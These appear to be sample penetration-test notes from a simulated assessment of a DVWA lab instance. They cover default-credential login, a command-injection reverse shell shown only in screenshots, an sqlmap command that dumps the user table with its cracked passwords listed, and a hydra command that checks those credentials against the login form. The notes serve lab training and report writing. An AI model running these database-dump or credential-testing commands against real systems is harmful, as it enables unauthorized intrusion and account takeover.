# Introduction

This document contains some sample notes from a simulated test of a DVWA instance.  Follow the [[Sample instructions]] for a sample workflow of how to slice these notes up into the way you'd like them to appear in the report.

# Target - `dvwa.pwn.me` 172.16.0.9/24

Scope of test is limited to the single subdomain/virtual host `dvwa.pwn.me` on host `172.16.0.9/24`. 

## Enumeration

![](../img/dvwa-nmap-scan.png)

![](../img/redirect-to-login-page.png)
Accessing `http://dvwa.pwn.me` takes us via redirect to `/login.php`.

![](../img/login-with-default-creds.png)

We can login with `admin:password`.

![](../img/https-not-supported.png)
HTTPS is configured on the host, but the target site is not accessible through HTTPS.  

# Foothold - reverse shell
## Testing command injection
![](../img/command-injection.png)
![](../img/receiving-shell-as-default-apache-user.png)
# Database - SQL injection vulnerability
![](../img/database-sql-injection-vulnerability.png)

![](../img/captured-sqli-request-for-use-with-sqlmap.png)



## Database dump leads to other users
![](../img/database-dump-with-cracked-webapp-user-credentials.png)

```bash
sqlmap -r dvwa.req --dump --batch
```
- `-r`: use the specified request file
- `--dump`: dump everything reachable
- `--batch`: assume default answers for `sqlmap` prompts; i.e. fully automatic

Using `sqlmap`, we were able to dump the entire DVWA user table, including cracked password hashes, shown below.

```
admin:password
gordonb:abc123
1337:charley
pablo:letmein
smithy:password
```

## Validating user creds by authenticating to webapp

![](../img/validating-user-credentials-with-hydra.png)
```bash
hydra -C creds dvwa.pwn.me  http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

Using `hydra`, we validated the credentials dumped from the DVWA users table.


# Flags

## `user`
![](../img/user-flag2.png)

As the `www-data` user, discovered flag at `/home/user/.flag2.txt`.
Readable only by `user`